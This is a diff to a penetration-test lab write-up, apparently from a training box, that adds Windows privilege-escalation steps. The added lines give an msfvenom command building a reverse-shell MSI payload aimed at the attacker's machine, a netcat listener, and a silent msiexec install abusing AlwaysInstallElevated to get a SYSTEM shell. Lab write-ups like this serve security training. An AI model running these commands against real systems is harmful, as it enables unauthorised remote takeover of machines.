@@ -268,7 +268,23 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221108103449.png)
 
 
+#### - Googled "alwayinstallelevated privilege escalation" and found the following webpage showing how to create a reverse shell payload. I typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=443 -f msi > installer.msi" to create the payload on my kali machine:
+
+![](Pasted%20image%2020221108103544.png)
+
+![](Pasted%20image%2020221108103623.png)
+
+
+
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+
+#### - Uploaded the reverse shell msi payload onto target machine
+
+#### - Started a netcat listener on kali machine listening on port 443
+
+#### - Per the "Windows Privelege Escalation (alwaysinstalleleveated)" webpage I typed "msiexec /quiet /qn /i [file name]" to run the reverse shell payload onto the target and received a shell running as NT/Authority System:
+
+
 
 ---
